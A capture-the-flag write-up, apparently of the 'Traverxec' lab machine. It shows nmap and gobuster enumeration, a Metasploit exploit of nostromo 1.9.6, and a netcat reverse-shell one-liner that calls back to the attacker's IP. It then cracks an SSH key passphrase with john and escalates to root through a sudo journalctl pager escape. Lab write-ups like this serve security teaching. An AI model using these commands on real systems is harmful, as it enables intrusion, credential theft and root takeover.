# nmap

enumerating the target with nmap,
```
â””â”€# nmap -Pn -A  -p-20000 -sS --vv 10.129.1.193            
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-17 09:12 IST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:12
Completed NSE at 09:12, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:12
Completed NSE at 09:12, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:12
Completed NSE at 09:12, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 09:12
Completed Parallel DNS resolution of 1 host. at 09:12, 0.12s elapsed
Initiating SYN Stealth Scan at 09:12
Scanning 10.129.1.193 [20000 ports]
Discovered open port 22/tcp on 10.129.1.193
Discovered open port 80/tcp on 10.129.1.193
SYN Stealth Scan Timing: About 10.36% done; ETC: 09:17 (0:04:28 remaining)
SYN Stealth Scan Timing: About 25.96% done; ETC: 09:16 (0:02:54 remaining)
SYN Stealth Scan Timing: About 45.04% done; ETC: 09:15 (0:01:51 remaining)
SYN Stealth Scan Timing: About 63.28% done; ETC: 09:15 (0:01:10 remaining)
Completed SYN Stealth Scan at 09:15, 164.39s elapsed (20000 total ports)
Initiating Service scan at 09:15
Scanning 2 services on 10.129.1.193
Completed Service scan at 09:15, 6.46s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.129.1.193
Retrying OS detection (try #2) against 10.129.1.193
Initiating Traceroute at 09:15
Completed Traceroute at 09:15, 0.27s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 09:15
Completed Parallel DNS resolution of 2 hosts. at 09:15, 0.11s elapsed
NSE: Script scanning 10.129.1.193.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:15
Completed NSE at 09:15, 5.59s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:15
Completed NSE at 09:15, 1.03s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:15
Completed NSE at 09:15, 0.00s elapsed
Nmap scan report for 10.129.1.193
Host is up, received user-set (0.26s latency).
Scanned at 2021-08-17 09:12:18 IST for 185s
Not shown: 19998 filtered ports
Reason: 19998 no-responses
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLpsS/IDFr0gxOgk9GkAT0G4vhnRdtvoL8iem2q8yoRCatUIib1nkp5ViHvLEgL6e3AnzUJGFLI3TFz+CInilq4=
|   256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGJ16OMR0bxc/4SAEl1yiyEUxC3i/dFH7ftnCU7+P+3s
80/tcp open  http    syn-ack ttl 63 nostromo 1.9.6
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.2 - 4.9 (92%), Linux 3.18 (90%), Linux 5.1 (90%), Crestron XPanel control system (90%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=8/17%OT=22%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=611B30D3%P=x86_64-pc-linux-gnu)
SEQ(SP=FF%GCD=1%ISR=10C%TI=Z%II=I%TS=A)
OPS(O1=M54BST11NW7%O2=M54BST11NW7%O3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST11NW7%O6=M54BST11)
WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
ECN(R=Y%DF=Y%TG=40%W=7210%O=M54BNNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 19.950 days (since Wed Jul 28 10:26:47 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   208.95 ms 10.10.16.1
2   262.49 ms 10.129.1.193

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:15
Completed NSE at 09:15, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:15
Completed NSE at 09:15, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:15
Completed NSE at 09:15, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 186.60 seconds
           Raw packets sent: 40181 (1.772MB) | Rcvd: 16818 (1.893MB)
```

we see its not an apache server but a nostromo server.

# gobuster

```
â”Œâ”€â”€(rootðŸ’€kali)-[~]
â””â”€# gobuster dir -u http://10.129.1.193 -w /usr/share/dirb/wordlists/common.txt -e -n
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.1.193
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] No status:               true
[+] Timeout:                 10s
===============================================================
2021/08/17 09:17:37 Starting gobuster in directory enumeration mode
===============================================================
http://10.129.1.193/css                  [Size: 314] [--> http://10.129.1.193/css/]
http://10.129.1.193/Documents and Settings [Size: 310]                             
http://10.129.1.193/icons                [Size: 314] [--> http://10.129.1.193/icons/]
http://10.129.1.193/img                  [Size: 314] [--> http://10.129.1.193/img/]  
http://10.129.1.193/index.html           [Size: 15674]                               
http://10.129.1.193/js                   [Size: 314] [--> http://10.129.1.193/js/]   
http://10.129.1.193/lib                  [Size: 314] [--> http://10.129.1.193/lib/]  
http://10.129.1.193/Program Files        [Size: 310]                                 
http://10.129.1.193/reports list         [Size: 310]                                 
                                                                                     
===============================================================
2021/08/17 09:21:37 Finished
===============================================================
```
I navigated to these directories but they are not much juicy

# searchsploit
```
â”Œâ”€â”€(rootðŸ’€kali)-[~]
â””â”€# searchsploit nostromo
---------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                              |  Path
---------------------------------------------------------------------------- ---------------------------------
Nostromo - Directory Traversal Remote Command Execution (Metasploit)        | multiple/remote/47573.rb
nostromo 1.9.6 - Remote Code Execution                                      | multiple/remote/47837.py
nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution        | linux/remote/35466.sh
---------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

let's search the same in metasploit.

# meatsploit

```
msf6 > search nostromo

Matching Modules
================

   #  Name                                   Disclosure Date  Rank  Check  Description
   -  ----                                   ---------------  ----  -----  -----------
   0  exploit/multi/http/nostromo_code_exec  2019-10-20       good  Yes    Nostromo Directory Traversal Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/nostromo_code_exec 
```
I used this exploit,set the appropriate parameters.I managed to get a shell.

I tried to get a reverse shell.

on my machine

> nc -lnvp 4242

on the vulnerable machine

>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.4 4242 >/tmp/f

spawn the reverse shell with
>python -c 'import pty;pty.spawn("/bin/bash")'

I searched for possible conf file for any potential passwords.
I found that there is a public_www directory in /home/david.
Theres a file named "backup-ssh-identity-files.tgz" in "/home/david/public_www/protected-file-area"

I tunneled this file into my machine and unzipped it using tar,which then gave an id_rsa key for the user david.

>tar -xzvf backup.tgz

contents of this file are

id_rsa,id_rsa_pub,authorized_keys.

```
â””â”€# cat id_rsa      
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F

seyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG
tuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3W
KzW9VFPujSQZnHM9Jho6J8O8LTzl+s6GjPpFxjo2Ar2nPwjofdQejPBeO7kXwDFU
RJUpcsAtpHAbXaJI9LFyX8IhQ8frTOOLuBMmuSEwhz9KVjw2kiLBLyKS+sUT9/V7
HHVHW47Y/EVFgrEXKu0OP8rFtYULQ+7k7nfb7fHIgKJ/6QYZe69r0AXEOtv44zIc
Y1OMGryQp5CVztcCHLyS/9GsRB0d0TtlqY2LXk+1nuYPyyZJhyngE7bP9jsp+hec
dTRqVqTnP7zI8GyKTV+KNgA0m7UWQNS+JgqvSQ9YDjZIwFlA8jxJP9HsuWWXT0ZN
6pmYZc/rNkCEl2l/oJbaJB3jP/1GWzo/q5JXA6jjyrd9xZDN5bX2E2gzdcCPd5qO
xwzna6js2kMdCxIRNVErnvSGBIBS0s/OnXpHnJTjMrkqgrPWCeLAf0xEPTgktqi1
Q2IMJqhW9LkUs48s+z72eAhl8naEfgn+fbQm5MMZ/x6BCuxSNWAFqnuj4RALjdn6
i27gesRkxxnSMZ5DmQXMrrIBuuLJ6gHgjruaCpdh5HuEHEfUFqnbJobJA3Nev54T
fzeAtR8rVJHlCuo5jmu6hitqGsjyHFJ/hSFYtbO5CmZR0hMWl1zVQ3CbNhjeIwFA
bzgSzzJdKYbGD9tyfK3z3RckVhgVDgEMFRB5HqC+yHDyRb+U5ka3LclgT1rO+2so
uDi6fXyvABX+e4E4lwJZoBtHk/NqMvDTeb9tdNOkVbTdFc2kWtz98VF9yoN82u8I
Ak/KOnp7lzHnR07dvdD61RzHkm37rvTYrUexaHJ458dHT36rfUxafe81v6l6RM8s
9CBrEp+LKAA2JrK5P20BrqFuPfWXvFtROLYepG9eHNFeN4uMsuT/55lbfn5S41/U
rGw0txYInVmeLR0RJO37b3/haSIrycak8LZzFSPUNuwqFcbxR8QJFqqLxhaMztua
4mOqrAeGFPP8DSgY3TCloRM0Hi/MzHPUIctxHV2RbYO/6TDHfz+Z26ntXPzuAgRU
/8Gzgw56EyHDaTgNtqYadXruYJ1iNDyArEAu+KvVZhYlYjhSLFfo2yRdOuGBm9AX
JPNeaxw0DX8UwGbAQyU0k49ePBFeEgQh9NEcYegCoHluaqpafxYx2c5MpY1nRg8+
XBzbLF9pcMxZiAWrs4bWUqAodXfEU6FZv7dsatTa9lwH04aj/5qxEbJuwuAuW5Lh
hORAZvbHuIxCzneqqRjS4tNRm0kF9uI5WkfK1eLMO3gXtVffO6vDD3mcTNL1pQuf
SP0GqvQ1diBixPMx+YkiimRggUwcGnd3lRBBQ2MNwWt59Rri3Z4Ai0pfb1K7TvOM
j1aQ4bQmVX8uBoqbPvW0/oQjkbCvfR4Xv6Q+cba/FnGNZxhHR8jcH80VaNS469tt
VeYniFU/TGnRKDYLQH2x0ni1tBf0wKOLERY0CbGDcquzRoWjAmTN/PV2VbEKKD/w
-----END RSA PRIVATE KEY-----
```

I cracked this rsa key using john.

>ssh2john id_rsa > forjohn.txt

```
â””â”€# john forjohn.txt -wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa)
1g 0:00:00:16 DONE (2021-08-17 10:52) 0.06172g/s 885290p/s 885290c/s 885290C/s *7Â¡Vamos!
Session completed
```

we got the passphrase

logging into the machine using rsa key of david and the passphrase via ssh
```
â”Œâ”€â”€(rootðŸ’€kali)-[~/home/david/.ssh]
â””â”€# ssh -i id_rsa david@10.129.1.193  
The authenticity of host '10.129.1.193 (10.129.1.193)' can't be established.
ECDSA key fingerprint is SHA256:CiO/pUMzd+6bHnEhA2rAU30QQiNdWOtkEPtJoXnWzVo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.1.193' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
david@traverxec:~$ whoami
david
david@traverxec:~$
```
# PrivEsc

after logging into the machine i found a bin dir the contents in it are
```
david@traverxec:~/bin$ ls
server-stats.head  server-stats.sh
```
I looked what's inside the shell script.

```
david@traverxec:~/bin$ cat server-stats.sh
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```
I ran the given command without the pipe.
>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service

and found this code from [gtfobins](https://gtfobins.github.io/gtfobins/journalctl/#sudo)

>!/bin/sh

```
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Mon 2021-08-16 23:41:35 EDT, end at Tue 2021-08-17 01:25:55 EDT. --
Aug 17 00:47:09 traverxec sudo[6467]: pam_unix(sudo:auth): authentication failure; lo
Aug 17 00:47:11 traverxec sudo[6467]: pam_unix(sudo:auth): conversation failed
Aug 17 00:47:11 traverxec sudo[6467]: pam_unix(sudo:auth): auth could not identify pa
Aug 17 00:47:11 traverxec sudo[6467]: www-data : command not allowed ; TTY=pts/4 ; PW
Aug 17 00:47:11 traverxec nologin[6529]: Attempted login by UNKNOWN on UNKNOWN
!/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
#
```

I am root :)




